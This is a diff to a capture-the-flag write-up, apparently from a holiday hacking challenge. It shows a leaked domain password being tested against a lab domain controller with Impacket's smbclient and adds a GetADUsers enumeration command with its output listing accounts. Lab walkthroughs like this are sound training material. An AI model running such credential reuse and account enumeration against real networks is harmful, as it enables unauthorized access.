@@ -120,7 +120,7 @@ joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJS
 ```
 So we have now the IP of the domain controller **10.0.0.53**, a valid user name **elfy** and the password for this user **J4`ufC49/J4766**
 
-Testing these credentials:
+As the Impacket toolset is installed on the server, we are using it to test these credentials:
 ```
 alabaster@ssh-server-vm:~/impacket$ ./smbclient.py northpole.local/elfy@10.0.0.53       
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -159,11 +159,25 @@ drw-rw-rw-          0  Sun Dec 10 01:13:44 2023 super_secret_research
 
 So it seems that the access to "super_secret_research" is restricted to researchers.
 
+```
+alabaster@ssh-server-vm:~/impacket$ ./GetADUsers.py -all -dc-ip 10.0.0.53 -dc-host npdc01  northpole.local/elfy
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Querying npdc01 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2023-12-10 01:03:20.201036  2023-12-10 05:15:44.266084 
+Guest                                                 <never>              <never>             
+krbtgt                                                2023-12-10 01:10:48.599596  <never>             
+elfy                                                  2023-12-10 01:12:50.495758  2023-12-10 10:48:43.229485 
+wombleycube                                           2023-12-10 01:12:50.605198  2023-12-10 11:20:42.486017 
+```
 
 
 
 **Achievement: Ipsum**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjMwODQzODMzLDEwODc4NTMxNDcsLTIwMT
+eyJoaXN0b3J5IjpbMTIxOTY4NjczLDEwODc4NTMxNDcsLTIwMT
 AxOTI2M119
 -->
